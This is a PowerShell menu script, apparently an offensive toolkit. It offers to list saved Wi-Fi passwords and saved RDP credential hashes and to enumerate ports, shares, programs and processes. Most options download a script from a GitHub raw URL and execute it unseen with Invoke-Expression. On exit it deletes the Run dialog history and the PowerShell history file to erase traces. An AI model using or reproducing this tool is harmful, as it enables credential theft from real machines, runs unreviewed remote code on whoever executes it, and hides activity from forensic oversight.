# Menu function to display options and get user input
function Show-Menu {
    Clear-Host
    Write-Host " -------------------------------------------------- "
    Write-Host "|                    SCRIPT MENU                   |"
    Write-Host " -------------------------------------------------- "
    Write-Host "0. Exit"
    Write-Host "1. List saved WLAN passwords"
    Write-Host "2. List RDP saved hash"
    Write-Host "3. List open ports on localhost"
    Write-Host "4. List shared folders on localhost"
    Write-Host "5. List programs installed on localhost"
    Write-Host "6. List processes running on localhost"
    Write-Host "7. Clean Windows Run and PowerShell history"

    Write-Host
    $choice = Read-Host "Enter your choice"

    # Process user input
    switch ($choice) {
        "0" { Run-Script0 }
        "1" { Run-Script1; Press-AnyKey; Show-Menu }
        "2" { Run-Script2; Press-AnyKey; Show-Menu } 
        "3" { Run-Script3; Press-AnyKey; Show-Menu }
        "4" { Run-Script4; Press-AnyKey; Show-Menu }
        "5" { Run-Script5; Press-AnyKey; Show-Menu }
        "6" { Run-Script6; Press-AnyKey; Show-Menu }
        "7" { Run-Script7; Press-AnyKey; Show-Menu }
        default {
            Write-Host "Invalid choice. Please try again."
            Show-Menu
        }
    }
}

# Define individual script functions
function Run-Script0 {
    Write-Host "Clearing execution history..."
    Set-Location HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\
    Remove-Item .\RunMRU\ -Recurse -Force -ErrorAction SilentlyContinue

    Write-Host "Clearing PowerShell history..."
    $historyPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $historyPath) {
        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
    }

    Write-Host "Goodbye"
    exit
}

function Run-Script1 {
    Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pemar95/Scripts/main/WLAN-PSW-Finder.ps1').Content)
}

function Run-Script2 {
    Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pemar95/Scripts/main/RetrieveRDPSavedHash.ps1').Content)
}

function Run-Script3 {
    Write-Host "Listing open TCP ports on localhost..."
    # Download the script content
    $scriptContent = (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pemar95/Scripts/main/Port-Discovery.ps1').Content
    # Execute the script in the current session and capture output
    $ports = Invoke-Expression $scriptContent
    # Format output nicely if it’s a collection of objects
    if ($ports) {
        $ports | Format-Table -AutoSize
    } else {
        Write-Host "No ports found or script returned nothing."
    }
    Write-Host
    Read-Host "Press Enter to continue..."
}


function Run-Script4 {
    Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pemar95/Scripts/main/SharedFolder.ps1').Content)
}

function Run-Script5 {
    Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pemar95/Scripts/main/ProgramLister.ps1').Content)
}

function Run-Script6 {
    Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pemar95/Scripts/main/Processes.ps1').Content)
}

function Run-Script7 {
    Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pemar95/Scripts/main/Clear-History.ps1').Content)
}

# Helper function to prompt user to press any key
function Press-AnyKey {
    Write-Host
    Write-Host "Press Enter to continue..."
    $key = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyUp")
}

# Start the script by showing the menu
Show-Menu
